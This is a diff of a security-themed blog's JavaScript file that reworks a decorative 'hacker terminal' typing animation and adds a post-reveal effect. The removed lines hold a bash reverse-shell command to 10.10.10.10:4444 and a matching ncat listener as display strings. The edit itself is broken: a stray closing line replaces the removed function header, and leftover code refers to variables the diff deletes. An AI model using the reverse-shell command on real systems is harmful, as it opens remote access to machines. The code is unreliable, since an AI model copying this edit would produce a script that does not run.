@@ -1,4 +1,3 @@
-
 // === Razor Blog JS (consolidated) ===
 
 // Reveal on scroll + stagger for cards
@@ -57,16 +56,68 @@
   if(document.readyState!=='loading') convertRouge(); else document.addEventListener('DOMContentLoaded', convertRouge);
 })();
 
-// Hero terminals typing (exactly two panels)
-(function(){
-  const A = document.querySelector('[data-ty="a"]'); // attacker
-  const B = document.querySelector('[data-ty="b"]'); // victim
-  if(!A || !B) return;
-  const seqVictim = ["bash -i >& /dev/tcp/10.10.10.10/4444 0>&1","whoami","www-data"];
-  const seqAttacker = ["ncat -lvnp 4444","listening on [any] 4444 ...","connection received from 10.10.10.42"];
-  function type(el, str, delay){ return new Promise(res=>{ let i=0; (function step(){ if(i<str.length){ el.textContent+=str[i++]; setTimeout(step, delay); } else { el.textContent+="\n"; res(); } })(); }); }
+ }); }
   async function run(){ A.textContent=""; B.textContent=""; for(let i=0;i<Math.max(seqVictim.length, seqAttacker.length);i++){ if(seqVictim[i]) await type(B, seqVictim[i], 22); if(seqAttacker[i]) await type(A, seqAttacker[i], 22); } }
   const grid = document.querySelector('.term-grid'); let played=false;
   const io = new IntersectionObserver(es=>{ es.forEach(e=>{ if(e.isIntersecting && !played){ played=true; run(); } }); }, {threshold:.12});
   if(grid) io.observe(grid); else run();
+})();
+
+// Hero terminals typing (attacker-only command entry)
+(function(){
+  const attacker = document.querySelector('[data-ty="a"]'); // attacker
+  const victim   = document.querySelector('[data-ty="b"]'); // victim
+  if(!attacker || !victim) return;
+
+  // Only the attacker types commands; victim stays mostly idle
+  const seqAttacker = [
+    "id",
+    "uid=0(root) gid=0(root) groups=0(root)"
+  ];
+
+  function typeLine(el, str, delay=24){
+    return new Promise(resolve => {
+      let i = 0;
+      function step(){
+        if(i < str.length){
+          el.textContent += str[i++];
+          setTimeout(step, delay);
+        }else{
+          el.textContent += "\n";
+          resolve();
+        }
+      }
+      step();
+    });
+  }
+
+  async function run(){
+    attacker.textContent = "";
+    victim.textContent = ""; // leave blank for idle victim
+    for(let i=0;i<seqAttacker.length;i++){
+      await typeLine(attacker, seqAttacker[i], 22);
+    }
+  }
+
+  const grid = document.querySelector('.term-grid');
+  let played = false;
+  const io = new IntersectionObserver((entries)=>{
+    entries.forEach(e=>{
+      if(e.isIntersecting && !played){
+        played = true;
+        run();
+      }
+    });
+  }, {threshold:.12});
+  if(grid) io.observe(grid); else run();
+})();
+// Post content: reveal children on scroll with small stagger
+(function(){
+  const body = document.querySelector('.post .post-body');
+  if(!body) return;
+  const nodes = Array.from(body.children);
+  nodes.forEach((el,i)=>{
+    el.classList.add('reveal');
+    el.style.transitionDelay = (i * 40) + 'ms';
+  });
 })();
